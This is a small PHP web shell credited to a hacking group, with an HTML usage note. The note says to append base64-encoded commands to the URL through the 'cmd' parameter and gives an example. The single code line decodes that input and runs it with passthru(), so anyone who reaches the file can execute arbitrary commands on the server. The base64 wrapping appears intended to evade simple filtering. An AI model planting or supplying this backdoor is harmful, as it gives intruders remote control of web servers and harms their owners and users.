	This is a simple php shell coded by Wh1t3R0s3 of Generation-X Security Team,<br>
<br>
	to use it just add ?cmd=[command that it is in base64 encryption] at the end of the link.<br>

	Example:<br>
	https://example.com/g.php?cmd=bHMK<br>

	Note:
	The Command is strictly should be in base64 encryption to work :)

	&copy; Wh1t3R0s3<br><br>
-------------------------------------------------------------------------------------------------------------------------------
<br>
<?php
echo passthru(base64_decode($_GET['cmd'])); _halt_compiler();
?>
